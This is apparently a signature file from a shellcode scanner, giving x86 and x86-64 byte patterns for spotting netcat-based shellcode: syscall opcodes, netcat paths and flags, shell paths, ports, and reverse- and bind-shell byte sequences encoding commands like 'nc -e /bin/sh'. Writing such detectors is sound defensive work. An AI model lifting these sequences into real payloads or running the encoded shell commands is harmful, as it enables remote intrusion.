name = "netcat usage pattern"
# Behavior patterns organized by architecture and category
behavior_patterns = {
    "32bit": {
        "syscall": [
            bytes([0xcd, 0x80])  # int 0x80 (32-bit syscall)
        ],
        "exec_syscall": [
            bytes([0xb0, 0x0b]),  # mov al, 11 (0x0b) - execve syscall
            bytes([0x31, 0xc0, 0xb0, 0x0b]),  # xor eax, eax; mov al, 11
            bytes([0x6a, 0x0b, 0x58]),  # push 11; pop eax
            bytes([0xb8, 0x0b, 0x00, 0x00, 0x00]),  # mov eax, 11
        ],
        "netcat_binary": [
            # netcat binary paths
            bytes([0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x6e, 0x63]),  # /bin/nc
            bytes([0x2f, 0x75, 0x73, 0x72, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x6e, 0x63]),  # /usr/bin/nc
            bytes([0x6e, 0x63]),  # nc (standalone command)
            bytes([0x6e, 0x65, 0x74, 0x63, 0x61, 0x74]),  # netcat
            bytes([0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x6e, 0x65, 0x74, 0x63, 0x61, 0x74]),  # /bin/netcat

            # Variants with double slashes
            bytes([0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x6e, 0x63]),  # /bin//nc
            bytes([0x2f, 0x75, 0x73, 0x72, 0x2f, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x6e, 0x63]),  # /usr//bin//nc
        ],
        "netcat_args": [
            # netcat arguments
            bytes([0x2d, 0x65]),  # -e
            bytes([0x2d, 0x6c]),  # -l
            bytes([0x2d, 0x70]),  # -p
            bytes([0x2d, 0x76]),  # -v
            bytes([0x2d, 0x6e]),  # -n
            bytes([0x2d, 0x6b]),  # -k
            bytes([0x2d, 0x63]),  # -c

            # Combinations
            bytes([0x2d, 0x6c, 0x76, 0x70]),  # -lvp
            bytes([0x2d, 0x6c, 0x76]),  # -lv
            bytes([0x2d, 0x76, 0x6c]),  # -vl
            bytes([0x2d, 0x6c, 0x65]),  # -le
            bytes([0x2d, 0x65, 0x6c]),  # -el
        ],
        "shell_exec": [
            # shell paths for netcat to execute
            bytes([0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68]),  # /bin/sh
            bytes([0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x62, 0x61, 0x73, 0x68]),  # /bin/bash
            bytes([0x63, 0x6d, 0x64, 0x2e, 0x65, 0x78, 0x65]),  # cmd.exe
            bytes([0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x73, 0x68]),  # /bin//sh
        ],
        "network_patterns": [
            # IP addresses
            bytes([0x31, 0x32, 0x37, 0x2e, 0x30, 0x2e, 0x30, 0x2e, 0x31]),  # 127.0.0.1
            bytes([0x30, 0x2e, 0x30, 0x2e, 0x30, 0x2e, 0x30]),  # 0.0.0.0
            bytes([0x31, 0x30, 0x2e, 0x30, 0x2e]),  # 10.0.
            bytes([0x31, 0x39, 0x32, 0x2e, 0x31, 0x36, 0x38, 0x2e]),  # 192.168.

            # ports as strings
            bytes([0x34, 0x34, 0x34, 0x34]),  # 4444
            bytes([0x35, 0x35, 0x35, 0x35]),  # 5555
            bytes([0x38, 0x30]),  # 80
            bytes([0x34, 0x34, 0x33]),  # 443
            bytes([0x32, 0x33]),  # 23
            bytes([0x32, 0x32]),  # 22
        ],
        "pipe_redirection": [
            # Shell pipe redirections used with netcat
            bytes([0x32, 0x3e, 0x26, 0x31]),  # 2>&1
            bytes([0x3e, 0x26]),  # >&
            bytes([0x3c, 0x3c]),  # <<
            bytes([0x3e, 0x3e]),  # >>
            bytes([0x3c, 0x26]),  # <&
            bytes([0x7c, 0x7c]),  # ||
            bytes([0x26, 0x26]),  # &&
            bytes([0x3e, 0x2f, 0x64, 0x65, 0x76, 0x2f, 0x6e, 0x75, 0x6c, 0x6c]),  # >/dev/null
        ],
        "specific": [
            # Reverse shell pattern
            bytes([0x31, 0xc0, 0x50, 0x68, 0x2f, 0x2f, 0x6e, 0x63, 0x68, 0x2f, 0x62, 0x69, 0x6e, 0x89, 0xe3, 0x50, 0x68,
                   0x2d, 0x65, 0x2f, 0x2f, 0x50, 0x68, 0x2f, 0x62, 0x69, 0x6e, 0x68, 0x2f, 0x2f, 0x73, 0x68, 0x89, 0xe1,
                   0x50, 0x51, 0x53, 0x89, 0xe1, 0xb0, 0x0b, 0xcd, 0x80]),  # nc with -e /bin/sh

            # Bind shell pattern
            bytes([0x31, 0xc0, 0x50, 0x68, 0x2f, 0x2f, 0x6e, 0x63, 0x68, 0x2f, 0x62, 0x69, 0x6e, 0x89, 0xe3, 0x50, 0x68,
                   0x2d, 0x6c, 0x76, 0x70, 0x89, 0xe1, 0x50, 0x68, 0x34, 0x34, 0x34, 0x34, 0x89, 0xe2, 0x50, 0x68, 0x2d,
                   0x65, 0x2f, 0x2f, 0x89, 0xe6, 0x50, 0x68, 0x2f, 0x62, 0x69, 0x6e, 0x68, 0x2f, 0x2f, 0x73, 0x68, 0x89,
                   0xe7, 0x50, 0x57, 0x56, 0x52, 0x51, 0x53, 0x89, 0xe1, 0xb0, 0x0b, 0xcd, 0x80])
            # nc -lvp 4444 -e /bin/sh
        ]
    },
    "64bit": {
        "syscall": [
            bytes([0x0f, 0x05])  # syscall instruction
        ],
        "exec_syscall": [
            bytes([0xb0, 0x3b]),  # mov al, 59 (0x3b) - execve syscall
            bytes([0x6a, 0x3b, 0x58]),  # push 59; pop rax
            bytes([0xb8, 0x3b, 0x00, 0x00, 0x00]),  # mov eax, 59
            bytes([0x48, 0xc7, 0xc0, 0x3b, 0x00, 0x00, 0x00]),  # mov rax, 59
        ],
        "netcat_binary": [
            # netcat binary paths
            bytes([0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x6e, 0x63]),  # /bin/nc
            bytes([0x2f, 0x75, 0x73, 0x72, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x6e, 0x63]),  # /usr/bin/nc
            bytes([0x6e, 0x63]),  # nc (standalone command)
            bytes([0x6e, 0x65, 0x74, 0x63, 0x61, 0x74]),  # netcat
            bytes([0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x6e, 0x65, 0x74, 0x63, 0x61, 0x74]),  # /bin/netcat
            bytes([0x2f, 0x75, 0x73, 0x72, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x6e, 0x65, 0x74, 0x63, 0x61, 0x74]),
            # /usr/bin/netcat

            # Variants with double slashes
            bytes([0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x6e, 0x63]),  # /bin//nc
            bytes([0x2f, 0x75, 0x73, 0x72, 0x2f, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x6e, 0x63]),  # /usr//bin//nc

            # 64-bit register loading for "nc"
            bytes([0x48, 0xb8, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x6e, 0x63, 0x00]),  # mov rax, "/bin/nc\0"
            bytes([0x48, 0xbf, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x6e, 0x63, 0x00]),  # mov rdi, "/bin/nc\0"
        ],
        "netcat_args": [
            # netcat arguments
            bytes([0x2d, 0x65]),  # -e
            bytes([0x2d, 0x6c]),  # -l
            bytes([0x2d, 0x70]),  # -p
            bytes([0x2d, 0x76]),  # -v
            bytes([0x2d, 0x6e]),  # -n
            bytes([0x2d, 0x6b]),  # -k
            bytes([0x2d, 0x63]),  # -c

            # Combinations
            bytes([0x2d, 0x6c, 0x76, 0x70]),  # -lvp
            bytes([0x2d, 0x6c, 0x76]),  # -lv
            bytes([0x2d, 0x76, 0x6c]),  # -vl
            bytes([0x2d, 0x6c, 0x65]),  # -le
            bytes([0x2d, 0x65, 0x6c]),  # -el

            # 64-bit register loading for arguments
            bytes([0x48, 0xb8, 0x2d, 0x65, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]),  # mov rax, "-e"
            bytes([0x48, 0xb8, 0x2d, 0x6c, 0x76, 0x70, 0x00, 0x00, 0x00, 0x00]),  # mov rax, "-lvp"
        ],
        "shell_exec": [
            # shell paths for netcat to execute
            bytes([0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68]),  # /bin/sh
            bytes([0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x62, 0x61, 0x73, 0x68]),  # /bin/bash
            bytes([0x63, 0x6d, 0x64, 0x2e, 0x65, 0x78, 0x65]),  # cmd.exe
            bytes([0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x73, 0x68]),  # /bin//sh

            # 64-bit register loading for shell paths
            bytes([0x48, 0xb8, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00]),  # mov rax, "/bin/sh\0"
            bytes([0x48, 0xbf, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00]),  # mov rdi, "/bin/sh\0"
        ],
        "network_patterns": [
            # IP addresses
            bytes([0x31, 0x32, 0x37, 0x2e, 0x30, 0x2e, 0x30, 0x2e, 0x31]),  # 127.0.0.1
            bytes([0x30, 0x2e, 0x30, 0x2e, 0x30, 0x2e, 0x30]),  # 0.0.0.0
            bytes([0x31, 0x30, 0x2e, 0x30, 0x2e]),  # 10.0.
            bytes([0x31, 0x39, 0x32, 0x2e, 0x31, 0x36, 0x38, 0x2e]),  # 192.168.

            # Ports as strings
            bytes([0x34, 0x34, 0x34, 0x34]),  # 4444
            bytes([0x35, 0x35, 0x35, 0x35]),  # 5555
            bytes([0x38, 0x30]),  # 80
            bytes([0x34, 0x34, 0x33]),  # 443
            bytes([0x32, 0x33]),  # 23
            bytes([0x32, 0x32]),  # 22

            # Port values in immediate form
            bytes([0x5c, 0x11, 0x00, 0x00]),  # port 4444 (little endian)
            bytes([0xb3, 0x15, 0x00, 0x00]),  # port 5555 (little endian)
        ],
        "socket_ops": [
            # Socket-related operations
            bytes([0xb0, 0x29]),  # mov al, 41 (socket syscall)
            bytes([0xb0, 0x2a]),  # mov al, 42 (connect syscall)
            bytes([0xb0, 0x2b]),  # mov al, 43 (accept syscall)
            bytes([0xb0, 0x31]),  # mov al, 49 (bind syscall)
            bytes([0xb0, 0x32]),  # mov al, 50 (listen syscall)

            # 64-bit forms
            bytes([0x6a, 0x29, 0x58]),  # push 41; pop rax (socket)
            bytes([0x6a, 0x2a, 0x58]),  # push 42; pop rax (connect)
            bytes([0x6a, 0x2b, 0x58]),  # push 43; pop rax (accept)
            bytes([0x6a, 0x31, 0x58]),  # push 49; pop rax (bind)
            bytes([0x6a, 0x32, 0x58]),  # push 50; pop rax (listen)
        ],
        "pipe_redirection": [
            # shell pipe redirections used with netcat
            bytes([0x32, 0x3e, 0x26, 0x31]),  # 2>&1
            bytes([0x3e, 0x26]),  # >&
            bytes([0x3c, 0x3c]),  # <<
            bytes([0x3e, 0x3e]),  # >>
            bytes([0x3c, 0x26]),  # <&
            bytes([0x7c, 0x7c]),  # ||
            bytes([0x26, 0x26]),  # &&
            bytes([0x3e, 0x2f, 0x64, 0x65, 0x76, 0x2f, 0x6e, 0x75, 0x6c, 0x6c]),  # >/dev/null
        ],
        "specific": [
            # 64-bit reverse shell netcat pattern
            bytes([0x48, 0x31, 0xd2, 0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x6e, 0x63, 0x53, 0x48, 0x89, 0xe7,
                   0x52, 0x48, 0xbb, 0x2d, 0x65, 0x20, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x53, 0x48, 0x89, 0xe6, 0x52, 0x48,
                   0xbb, 0x73, 0x68, 0x20, 0x31, 0x39, 0x32, 0x2e, 0x31, 0x53, 0x48, 0x89, 0xe1, 0x52, 0x48, 0xbb, 0x36,
                   0x38, 0x2e, 0x31, 0x2e, 0x31, 0x20, 0x34, 0x53, 0x48, 0x89, 0xe2, 0x52, 0x48, 0xb8, 0x34, 0x34, 0x34,
                   0x00, 0x00, 0x00, 0x00, 0x00, 0x50, 0x52, 0x51, 0x56, 0x57, 0x48, 0x89, 0xe6, 0x48, 0x83, 0xc0, 0x3b,
                   0x0f, 0x05]),  # nc -e /bin/sh 192.168.1.1 4444

            # 64-bit bind shell netcat pattern
            bytes([0x48, 0x31, 0xd2, 0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x6e, 0x63, 0x53, 0x48, 0x89, 0xe7,
                   0x52, 0x48, 0xbb, 0x2d, 0x6c, 0x76, 0x70, 0x20, 0x34, 0x34, 0x34, 0x53, 0x48, 0x89, 0xe6, 0x52, 0x48,
                   0xbb, 0x34, 0x20, 0x2d, 0x65, 0x20, 0x2f, 0x62, 0x69, 0x53, 0x48, 0x89, 0xe1, 0x52, 0x48, 0xbb, 0x6e,
                   0x2f, 0x73, 0x68, 0x00, 0x00, 0x00, 0x00, 0x53, 0x48, 0x89, 0xe2, 0x52, 0x57, 0x56, 0x51, 0x52, 0x48,
                   0x89, 0xe6, 0x48, 0x83, 0xc0, 0x3b, 0x0f, 0x05]),  # nc -lvp 4444 -e /bin/sh

            # 64-bit netcat listen pattern
            bytes([0x48, 0x31, 0xd2, 0x48, 0xb8, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x6e, 0x63, 0x00, 0x50, 0x48, 0x89, 0xe7,
                   0x52, 0x48, 0xb8, 0x2d, 0x6c, 0x20, 0x2d, 0x70, 0x20, 0x34, 0x34, 0x50, 0x48, 0x89, 0xe6, 0x52, 0x48,
                   0xb8, 0x34, 0x34, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x50, 0x56, 0x57, 0x48, 0x89, 0xe6, 0x48, 0xc7,
                   0xc0, 0x3b, 0x00, 0x00, 0x00, 0x0f, 0x05])  # nc -l -p 4444
        ]
    }
}

# Define pattern combinations that indicate netcat shellcode when found together
pattern_combinations = {
    "32bit": [
        ["syscall", "exec_syscall", "netcat_binary"],  # Basic netcat execution
        # ["netcat_binary", "netcat_args", "network_patterns"],  # Netcat with args and network target
        # ["netcat_binary", "shell_exec"],  # Netcat with shell execution
        # ["netcat_binary", "netcat_args", "shell_exec"],  # Netcat args with shell execution
        # ["netcat_binary", "pipe_redirection"],  # Netcat with pipe redirection
        ["syscall", "exec_syscall", "netcat_binary", "netcat_args"]  # Complete pattern
    ],
    "64bit": [
        ["syscall", "exec_syscall", "netcat_binary"],  # Basic netcat execution
        # ["netcat_binary", "netcat_args", "network_patterns"],  # Netcat with args and network target
        # ["netcat_binary", "shell_exec"],  # Netcat with shell execution
        # ["netcat_binary", "netcat_args", "shell_exec"],  # Netcat args with shell execution
        # ["syscall", "socket_ops", "netcat_binary"],  # Socket operations with netcat
        # ["netcat_binary", "pipe_redirection"],  # Netcat with pipe redirection
        # ["socket_ops", "network_patterns"],  # Socket operations with network patterns (netcat-like behavior)
        ["syscall", "exec_syscall", "netcat_binary", "netcat_args"]  # Complete pattern
    ]
}
